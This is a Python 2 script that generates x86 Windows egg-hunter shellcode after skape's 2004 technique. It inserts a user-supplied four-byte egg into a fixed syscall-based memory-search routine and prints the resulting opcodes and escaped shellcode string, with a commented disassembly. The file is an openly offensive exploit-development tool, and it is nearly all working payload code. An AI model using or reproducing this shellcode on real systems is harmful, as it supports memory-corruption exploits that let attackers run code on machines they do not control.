#!/usr/bin/python

import binascii
import time
import sys

# colors (*NIX systems only)
W = '\033[0m'  # white
R = '\033[91m' # Light Red
G = '\033[32m' # green
M = '\033[95m' # Light magenta

# the script takes user supplied egg as input and plug it to Skape's piece of art! the output (opcode) is debugger and binary file friendly.
# Reference: "Safely Searching Process Virtual Address Space" skape 2004 http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
# 0:  66 81 ca ff 0f          or     dx,0xfff
# 5:  42                      inc    edx
# 6:  52                      push   edx
# 7:  6a 02                   push   0x2
# 9:  58                      pop    eax
# a:  cd 2e                   int    0x2e
# c:  3c 05                   cmp    al,0x5
# e:  5a                      pop    edx
# f:  74 ef                   je     0x0
# 11: b8 54 30 30 57          mov    eax,0x57303054           egg = "T00W"
# 16: 8b fa                   mov    edi,edx
# 18: af                      scas   eax,DWORD PTR es:[edi]
# 19: 75 ea                   jne    0x5
# 1b: af                      scas   eax,DWORD PTR es:[edi]
# 1c: 75 e7                   jne    0x5
# 1e: ff e7                   jmp    edi 

if len(sys.argv) < 2:
		print "Usage: python EggHunter.py <"+G+"egg"+W+">"
		sys.exit(0)

Input          = str(sys.argv[1])
Egg            = binascii.hexlify(Input)
Egg            = list(Egg)
OpCode         = Egg[6]+Egg[7]+Egg[4]+Egg[5]+Egg[2]+Egg[3]+Egg[0]+Egg[1]
Shellcode      = "\\x"+Egg[6]+Egg[7]+"\\x"+Egg[4]+Egg[5]+"\\x"+Egg[2]+Egg[3]+"\\x"+Egg[0]+Egg[1]
FinalOpcode    = "6681caff0f42526a0258cd2e3c055a74efb8" +M+ OpCode +W+ "8bfaaf75eaaf75e7ffe7"
FinalShellcode = "'\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8" +M+ Shellcode +W+ "\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7'"

print "["+G+"+"+W+"] Egg Hunter shellcode with egg of '"+M+Input+W+"'.."
time.sleep(1)
print R+"Final Opcode    "+W+": " + FinalOpcode
print R+"Final Shellcode "+W+": " + FinalShellcode
